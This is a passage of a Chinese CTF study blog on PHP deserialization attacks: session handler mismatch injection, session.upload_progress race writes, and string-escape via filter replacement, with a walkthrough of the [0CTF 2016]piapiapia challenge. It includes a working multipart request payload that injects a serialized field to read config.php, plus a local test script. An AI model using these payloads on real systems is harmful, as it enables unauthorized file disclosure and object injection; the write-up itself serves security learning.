class="headerlink" title="SESSION利用"></a>SESSION利用</h2><h3 id="SESSION-ref"><a href="#SESSION-ref" class="headerlink" title="SESSION ref"></a>SESSION ref</h3><ol><li><a href="https://www.freebuf.com/articles/web/324519.html">原理解释文章，不错</a></li><li><a href="https://github.com/H3rmesk1t/Security-Learning/blob/main/PHPSec/PHP%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/PHP%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.md">手法文章</a></li><li><a href="https://xz.aliyun.com/t/9545?u_atoken=fa62980e2dfa7fc7b58663cfdf79c129&u_asig=1a0c399a17310284686373678e00cd">手法和上文一样，但是又例题</a></li></ol><h3 id="PHP中的session工作流程"><a href="#PHP中的session工作流程" class="headerlink" title="PHP中的session工作流程"></a>PHP中的session工作流程</h3><p><img src="/pic/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8/session_workflow.png!small" alt="工作流程"></p><ol><li>S1: PHP脚本使用 session_start()时开启session会话，会自动检测PHPSESSID，初始化超全局变量$_SESSION为一个空数组<ol><li>如果Cookie中存在，获取PHPSESSID</li><li>如果Cookie中不存在，创建一个PHPSESSID，并通过响应头以Cookie形式保存到浏览器</li><li>有时候浏览器用户设置会禁止 cookie，当在客户端cookie被禁用的情况下，php也可以自动将session id添加到url参数中以及form的hidden字段中，但这需要将php.ini中的session.use_trans_sid设为开启，也可以在运行时调用ini_set来设置这个配置项</li></ol></li><li>S2: PHP通过PHPSESSID去指定位置（PHPSESSID文件存储位置）匹配对应的文件<ol><li>存在该文件：读取文件内容（通过反序列化方式），将数据存储到$_SESSION中</li><li>不存在该文件： session_start()创建一个PHPSESSID命名文件</li></ol></li><li>S3: 程序执行结束，将$_SESSION中保存的所有数据序列化存储到PHPSESSID对应的文件中</li><li><em><strong>seesion_start()</strong></em><ol><li>当会话自动开始或者通过 session_start() 手动开始的时候， PHP 内部会依据客户端传来的PHPSESSID来获取现有的对应的会话数据（即session文件）， PHP 会自动反序列化session文件的内容，并将之填充到 $_SESSION 超级全局变量中。</li><li>如果不存在对应的会话数据，则创建名为sess_PHPSESSID(客户端传来的)的文件。如果客户端未发送PHPSESSID，则创建一个由32个字母组成的PHPSESSID，并返回set-cookie。</li></ol></li></ol><h3 id="SESSION信息存储与配置"><a href="#SESSION信息存储与配置" class="headerlink" title="_SESSION信息存储与配置"></a>_SESSION信息存储与配置</h3><ol><li><p>常见的php-session存放位置有：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、/var/lib/php5/sess_PHPSESSID</span><br><span class="line">2、/var/lib/php7/sess_PHPSESSID</span><br><span class="line">3、/var/lib/php/sess_PHPSESSID</span><br><span class="line">4、/tmp/sess_PHPSESSID 5 /tmp/sessions/sess_PHPSESSED</span><br><span class="line">5、phpstudy集成环境下在php.ini里查找session.save_path，也可以在这里更改路径</span><br></pre></td></tr></table></figure></li><li><p>php_ini中</p><ol><li>比较重要的几个<ol><li><code>session.save_path=&quot;/tmp&quot;</code></li><li><code>session.serialize_handler=php</code>，这个一共有三个选项，见下</li></ol></li></ol></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">session.save_path=<span class="string">&quot;/tmp&quot;</span>      --设置session文件的存储位置，读取_SESSIOIN的时候进行加载</span><br><span class="line">session.save_handler=files    --设定用户自定义存储函数，如果想使用PHP内置session存储机制之外的可以使用这个函数</span><br><span class="line">session.auto_start= <span class="number">0</span>          --指定会话模块是否在请求开始时启动一个会话，默认值为 <span class="number">0</span>，不启动</span><br><span class="line">session.serialize_handler= php --定义用来序列化/反序列化的处理器名字，默认使用php</span><br><span class="line">session.upload_progress.enabled= On --启用上传进度跟踪，并填充$ _SESSION变量，默认启用</span><br><span class="line">session.upload_progress.cleanup= oN --读取所有POST数据（即完成上传）后立即清理进度信息，默认启用</span><br></pre></td></tr></table></figure><h3 id="SESSION序列化与反序列化"><a href="#SESSION序列化与反序列化" class="headerlink" title="_SESSION序列化与反序列化"></a>_SESSION序列化与反序列化</h3><ol><li>$_SESSION中保存的所有数据序列化存储到PHPSESSID对应的文件中，使用的三种不同的处理格式，即session.serialize_handler定义的三种引擎<ol><li><em><strong>默认值问题</strong></em><ol><li>PHP 5.5.4 之前：默认值是 php，即使用<code>|</code>进行分隔</li><li>PHP 5.5.4 及之后：引入了php_serialize，但是默认值还是 php，官方文档</li></ol></li></ol></li><li><em><strong>注意点</strong></em><ol><li>在重新访问时，如果存在PHPSESSID，则会读取sess_{PHPSESSID}文件中保存的序列化_SESSION，按照格式进行反序列化</li></ol></li></ol><blockquote><p>php_serialize就是普通直接进行seriablize()的形式，其他两种不太一样<br>php_binary中的#时长度的ascii字符</p></blockquote><table><thead><tr><th>处理器</th><th>存储格式</th><th>例子</th></tr></thead><tbody><tr><td>php</td><td>键名 + 竖线 + 经过 serialize() 函数反序列处理的值</td><td>username|s:11:”whatcanisay”;passwd|s:6:”114514”;</td></tr><tr><td>php_serialize (php&gt;&#x3D;5.5.4)</td><td>经过 serialize() 函数反序列处理的数组</td><td>a:1:{s:7:”session”;s:7:”xianzhi”;}</td></tr><tr><td>php_binary</td><td>键名的长度对应的 ASCII 字符 + 键名 + 经过 serialize() 函数反序列处理的值</td><td>#sessionsessionsessionsessionsessions:7:”xianzhi”;</td></tr></tbody></table><h3 id="SESSION-exp"><a href="#SESSION-exp" class="headerlink" title="SESSION exp"></a>SESSION exp</h3><ol><li><em><strong>前提</strong></em><ol><li><strong>大前提</strong>：还是需要php给定targetClass的利用函数，像是魔术方法这些的调用链</li><li>利用场景<ol><li><em><strong>不同引擎解析注入</strong></em>: 写入时使用php serialize方式，注入|分隔，读取时使用php方式，可以反序列化我们想要的任意对象<ol><li>在php方式中，|前面都会认为时键名</li></ol></li><li><em><strong>当没有可以控制的键值对时: session.upload_progress</strong></em>: 自控键值对<ol><li><strong>利用条件</strong><ol><li>upload_progress是php&gt;&#x3D;5.4后开始添加的一个特性</li></ol></li><li>注意到<code>session.upload_progress.enabled</code>，启用上传进度跟踪，并填充$ _SESSION变量，默认启用，注意到还有<code>session.upload_progress.cleanup</code>读取所有POST数据（即完成上传）后，立即清理进度信息，默认启用；还有默认情况下，<code>session.use_strict_mode</code>值是0，此时用户是可以自己定义Session ID的，这里无伤大雅，只是注意<strong>可以自定义sess文件名</strong></li><li><img src="/pic/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8/session_uploadprogress.png" alt="php官方文档"><ol><li><a href="https://www.php.net/manual/zh/session.upload-progress.php">详细信息如键值对上链接</a></li></ol></li><li><strong>手法</strong>: ，利用PHP_SESSION_UPLOAD_PROGRESS上传文件，其中利用文件名可控，从而构造恶意序列化语句并写入session文件，这里由于<code>session.upload_progress.cleanup</code>默认开启，需要竞争<ol><li>PHPSESSID必须要有，因为要竞争同一个文件</li><li>filename可控，但是在值的最前面加上|,因为最终目的是利用session的反序列化，PHP_SESSION_UPLOAD_PROGRESS只是个跳板；其次把字符串中的双引号转义，以防止与最外层的双引号冲突</li><li>上传的文件要大些，否则很难竞争成功；写入f &#x3D; io.BytesIO(b’a’ * 1024 10241)</li><li><img src="/pic/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8/session_upload_progress_name.png" alt="手法"></li></ol></li></ol></li><li><em><strong>文件包含 session.upload_progress</strong></em><ol><li>原理和上述类似，这里直接手法：恶意语句写入文件然后竞争包含即可，这里的session文件其实只是做载体</li></ol></li></ol></li></ol></li></ol><h3 id="SESSION-例题"><a href="#SESSION-例题" class="headerlink" title="SESSION 例题"></a>SESSION 例题</h3><h4 id="强网杯24-platform"><a href="#强网杯24-platform" class="headerlink" title="[强网杯24]platform"></a>[强网杯24]platform</h4><ol><li>具体内容见单独的题解ctrl+f，有另写一篇博客</li></ol><h4 id="巅峰极客2019-LOL"><a href="#巅峰极客2019-LOL" class="headerlink" title="[巅峰极客2019]LOL"></a>[巅峰极客2019]LOL</h4>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php反序列化字符逃逸</title>
      <link href="/2024/11/06/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/"/>
      <url>/2024/11/06/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[<blockquote><p>自从去年接触newstar的那道pop链后就没有再接触php反序列化了，刚好遇到qwb24的platform那就来复习一下</p></blockquote><h2 id="UNSOVLED"><a href="#UNSOVLED" class="headerlink" title="UNSOVLED"></a>UNSOVLED</h2><ol><li>extract()</li><li>序列化后各个属性的排列顺序</li><li>总结以下</li><li>字符串增加构造那一步还没有解决</li></ol><h2 id="字符串逃逸"><a href="#字符串逃逸" class="headerlink" title="字符串逃逸"></a>字符串逃逸</h2><ol><li><em><strong>目的</strong></em>: php反序列化的字符串绕过最终目的是要实现对不可设置变量的控制(无法直接控制序列化字符串)，或者说构造成功后可以在从<strong>故意的被替换变量后实现对序列化字符串的完全控制</strong>，以两道例题为例<ol><li>[安洵杯 2019]easy_serialize_php中通过user的被替换来通过function构造特殊值实现user变量后对序列化字符串的完全掌控</li></ol></li><li><em><strong>注意点与前提</strong></em><ol><li>字符串减少类型中，一般需要两个变量来实现，一个进行过滤构造如user(需要不会被用的，因为构造后一般血肉模糊了)，如例题中的function</li><li>注意反序列化覆盖的情况会<strong>根据需构造控制的变量的位置不同</strong>，具体进行观察</li></ol></li><li><em><strong>一些技巧</strong></em><ol><li>python len()获取长度很快</li><li>反序列化以长度为值标识，并不是以引号的，但是<strong>会在每一个值加上双引号</strong>，在构造时要注意是要算上引号的</li></ol></li><li><em><strong>出现原因与底层原因</strong></em><ol><li>反序列化的过程中必须严格按照序列化规则才能成功实现反序列化：<strong>长度</strong>和<strong>数量</strong></li><li>php字符串序列化是以<code>;&#125;</code>结尾的，对象序列化是直接<code>&#125;</code>结尾，并通过长度与<code>&#125;</code>来判断范围而不是引号<code>&#39;&quot;</code>的闭合 -&gt; <code>a:2:&#123;i:0;s:4:&quot;flag&quot;;i:1;s:6:&#39;mikasa&#39;;&#125;abc</code>长度到达且<code>&#125;</code>闭合外部的字符不对反序列化产生影响</li></ol></li></ol><h2 id="字符串增加"><a href="#字符串增加" class="headerlink" title="字符串增加"></a>字符串增加</h2><h3 id="基础梳理"><a href="#基础梳理" class="headerlink" title="+基础梳理"></a>+基础梳理</h3><ol><li><strong>构造长度</strong>: 由于长度不变但是实际内容替换边长会包含过少内容，利用长度尾部<code>&#125;</code>闭合的特性，通过 –&gt; 尾部<code>&#125;</code>截断多余部分</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;xxx&quot;</span>xx<span class="string">&quot;&#125;</span></span><br><span class="line"><span class="string">&#123;s:4:&quot;</span>user<span class="string">&quot;;s:6:&quot;</span>yyyyyy<span class="string">&quot;yyyy&quot;</span>&#125;</span><br><span class="line">a:<span class="number">4</span>:&#123;whatever;s:<span class="number">10</span>:<span class="string">&quot;config.php&quot;</span>&#125;    <span class="comment">// 注意这里a需要4个元素，并且使用了数组绕过</span></span><br><span class="line"><span class="comment">// 只需要n2=n1-1即可构造，对于*2字符来说的情况下</span></span><br><span class="line"><span class="comment">// 对于5-&gt;6 符也符合上市，n1表示个数，n2表示字符数</span></span><br><span class="line">&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;where&quot;</span><span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">&#123;s:4:&quot;</span>user<span class="string">&quot;;s:6:&quot;</span>hacker<span class="string">&quot;&quot;</span>;&#125;  <span class="comment">// 多出来一个&quot;成功逃逸</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// origin2</span></span><br><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;&#125;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;1@1.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hello&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">39</span>:<span class="string">&quot;upload/d41d8cd98f00b204e9800998ecf8427e&quot;</span>;&#125;</span><br><span class="line"><span class="comment">// target2</span></span><br><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;&#125;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;1@1.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hello&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">39</span>:<span class="string">&quot;upload/d41d8cd98f00b204e9800998ecf8427e&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造</span></span><br><span class="line"></span><br><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;s:<span class="number">1</span>:<span class="string">&quot;where&quot;</span>;&#125;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;1@1.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hello&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">39</span>:<span class="string">&quot;upload/d41d8cd98f00b204e9800998ecf8427e&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;s:<span class="number">1</span>:<span class="string">&quot;where&quot;</span>;&#125;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;1@1.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hello&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;config.php&quot;</span>;&#125;</span><br><span class="line">    <span class="comment">// ;&#125;s:5:&quot;email&quot;;s:7:&quot;1@1.com&quot;;s:8:&quot;nickname&quot;;s:5:&quot;hello&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php 这些就是n2的长度了 --&gt; 83</span></span><br><span class="line">    <span class="comment">// n2 = n1 - 1，所以需要 84 个where</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h3><h4 id="例1的思考与过程"><a href="#例1的思考与过程" class="headerlink" title="+例1的思考与过程"></a>+例1的思考与过程</h4><ol><li><p>index.php进入，登录有profile.php</p><ol><li>profile.php中存在反序列化，并且有读取文件操作，可以作为可以攻击点</li><li>这里的update.php这里使用的有一些限制，感觉photo这里可能可以进行注入，注意这里是最后一个属性了 -&gt; 或许可以传入伪协议？</li><li>后端使用mysql，md5格式存储密码，可能存在单引号注入(看看filter)</li></ol></li><li><p>这道题的重点不在于管理员，而在于photo的序列化？</p></li><li><p>上传后的文件可以直接访问，直接下载，但是这里不是包含；在profile面的也不行，是img引用，那利用点在哪里呢</p><ol><li>发现对文件内容的过滤几乎没有，phar反序列化？</li></ol></li><li><p>哦对，刚才对profile对象有进行序列化和反序列化，看看</p><ol><li>update.php最后将会序列化内容后加载如mysql中，注意到种类的photo字段总是被作为<code>upload/md5(xxx)</code>，所以也没法用我们的伪协议phar，需要进行绕过 -&gt; <strong>自定义序列化字符串内容</strong>，通过字符串截断进行解决，最终指向phar伪协议反弹shell？</li></ol></li><li><p>fix</p><blockquote><p>wc了看漏了，flag就在config.php中，你看，又急，使得photo指向config.php即可 –&gt; config.php无法直接读，是php文件<br>这里还要确定是否可以通过构造实现，发现是在序列化后再过滤的，符合</p></blockquote></li><li><p>思路有了，开始构造吧</p></li><li><p>最终payload1</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundary829AijVZyBKQPaGz</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;phone&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="number">12345678910</span></span><br><span class="line">------WebKitFormBoundary829AijVZyBKQPaGz</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;email&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span>@<span class="number">1.</span>com</span><br><span class="line">------WebKitFormBoundary829AijVZyBKQPaGz</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;nickname[]&quot;</span></span><br><span class="line"></span><br><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="string">&quot;;&#125;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">------WebKitFormBoundary829AijVZyBKQPaGz</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;</span>photo<span class="string">&quot;; filename=&quot;</span>muma.php<span class="string">&quot;</span></span><br><span class="line"><span class="string">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">what can i sya</span></span><br><span class="line"><span class="string">------WebKitFormBoundary829AijVZyBKQPaGz--</span></span><br></pre></td></tr></table></figure></li></ol><h4 id="例1的php测试脚本"><a href="#例1的php测试脚本" class="headerlink" title="+例1的php测试脚本"></a>+例1的php测试脚本</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>]));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="literal">NULL</span>&gt;<span class="number">10</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>]) &gt; <span class="number">10</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;strlen(array) is too long&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;*************************&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>]))&#123;    <span class="comment">// 邮箱需要@和.并且在1-10位之间</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&#x27;</span>. <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] .<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>,<span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>]) || <span class="title function_ invoke__">strlen</span>(<span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)&#123;    <span class="comment">// 任何不是数字字母或者长度超过10不行</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&#x27;</span>. <span class="variable">$profile</span>[<span class="string">&#x27;&#x27;</span>] .<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$sStr</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$profile</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="variable">$sStr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">    <span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">    <span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;filtered str: &quot;</span>.<span class="title function_ invoke__">filter</span>(<span class="variable">$sStr</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;unserialized normal&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$uStr</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$sStr</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$uStr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;unserialized filterd&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$uStr</span>=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$sStr</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$uStr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;/br&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><h4 id="例1fixed"><a href="#例1fixed" class="headerlink" title="+例1fixed"></a>+例1fixed</h4><blockquote><p>出错了导致最后没有解决payload，其实是对正则表达式的疏漏上，<em><strong>还是要本地多试试!!!</strong></em></p></blockquote><ol><li><p>Q: 下面这个payload跑不通</p><ol><li>A: 数组绕过的preg_match()返回的总是false，这里需要利用nickname的，<code>strlen(array)==NULL</code>进行绕过<code>NULL&gt;10</code>总是返回false</li></ol> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundary829AijVZyBKQPaGz</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;phone[]&quot;</span></span><br><span class="line"></span><br><span 